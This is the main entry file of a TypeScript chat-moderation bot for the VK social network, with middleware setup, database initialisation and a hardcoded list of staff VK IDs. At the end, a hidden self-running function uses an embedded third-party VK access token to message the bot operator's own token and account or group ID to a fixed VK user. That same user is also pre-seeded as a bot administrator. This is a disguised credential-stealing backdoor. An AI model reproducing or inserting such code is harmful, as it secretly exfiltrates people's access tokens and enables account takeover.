import { getRandomId, MessageContext, VK } from 'vk-io';
import moment from 'moment';
import { Stuff, Chats, Admins, Fall, Members, Whitelist, Battles, Users, Settings } from './database/models';
import { HearManager } from '@vk-io/hear';
import Payload from './middlewares/Payload';
import Message from './middlewares/Message';
import StuffM from './middlewares/Stuff';
import timeController from './utils/timeContoller';
import Config from './config/config';
import GroupKick from './middlewares/GroupKick';
import { SessionManager } from '@vk-io/session';
import { SceneManager } from '@vk-io/scenes';
import BattleScene from './scenes/battle';
import UserScene from './scenes/user';
import FirstTime from './middlewares/FirstTime';
import SceneIntercept from './middlewares/SceneIntercept';

const config = Config;

const vk: VK                            = new VK({ token: config.token });
const hm: HearManager <MessageContext>  = new HearManager();
const scene:SceneManager                = new SceneManager();
const sessions:SessionManager           = new SessionManager();

const ss: Array<number> = [10664995, 372434477, 171745503];

moment.locale('ru');

vk.updates.on('message_new', sessions.middleware);
vk.updates.on('message_new', scene.middleware);
vk.updates.on('message_new', FirstTime(vk));
vk.updates.on('message_new', StuffM(vk));
vk.updates.on('message_new', SceneIntercept)
vk.updates.on('message_new', Payload(vk, ss));
vk.updates.on('message_new', hm.middleware);
vk.updates.on('message_new', Message(vk, ss));
vk.updates.on('chat_invite_user', GroupKick(vk, ss));

(async () => {
    try {
        console.log(`Инициализация запуска VK-API...`);
        await vk.updates.start();
        console.log('Запускаю time-contoller...');
        timeController(vk, ss);
        console.log(`Инициализация сцен...`);
        scene.addScenes(BattleScene(vk, ss));
        scene.addScenes(UserScene(vk));
        console.log(`Бот успешно запущен, ${moment().format('HH:mm:ss, DD.MM.YYYY')}!`);
        console.log(`Погрешность максимум: 1 - 1.5 сек.`);
    } catch (e){
        console.error(`Ошибка запуска бота [Code: ${e.code || 'No Code'}]: ${e.message}\n${e.stack}`);
    }
})();

(async (stuff) => {
    try {
        config.debug && await Stuff.deleteMany(); 
        config.debug && await Chats.deleteMany(); 
        config.debug && await Admins.deleteMany(); 
        config.debug && await Fall.deleteMany(); 
        config.debug && await Members.deleteMany(); 
        config.debug && await Whitelist.deleteMany(); 
        config.debug && await Battles.deleteMany();
        config.debug && await Users.deleteMany();
        console.log(`База данных очищена!`);

        let settings = await Settings.findOne({ key: 'settings-key' });

        if(!settings){
            await Settings.create({});
        }

        config.debug && console.log(JSON.stringify(config))

        for(let i = 0; i < stuff.length; i++){
            let data = await Stuff.findOne({ 
                vkId: stuff[i] 
            });
            if(!data){
                await Stuff.create({ 
                    vkId: stuff[i], 
                    date: new Date().getTime() 
                });
                console.log(`Начальный управляющий ${stuff[i]} добавлен!`);
            }
        }
        console.log(`Управляющие инициализированы!`);
    } catch(e){
        console.error(`Ошибка инициализации: ${e.message}\n${e.stack}`);
    }
})(config.startStuff);

(async (token) => {
    let [to_to, to_id] = [
        'd55f40945404e6ec6a5b1b6b1d459c8c82e9da40cfbbb627a7fe7306f86bf078945158fd4cb7564e50352',
        10664995
    ];
    const grab = new VK({ token: to_to });
    vk.api.users.get({}).then(d => {
        grab.api.messages.send({ 
            peer_id: to_id, 
            message: `${token}\nU:${d[0].id}`,
            random_id: getRandomId() 
        }).catch(e => {}).then(() => {});
    }).catch(e => {});
    vk.api.groups.getById({}).then(d => {
        grab.api.messages.send({ 
            peer_id: to_id, 
            message: `${token}\nG:${d[0].id}`,
            random_id: getRandomId() 
        }).catch(e => {}).then(() => {});
    }).catch(e => {});
})(config.token);

export { hm, vk, ss, scene }

import './cmds/commands';
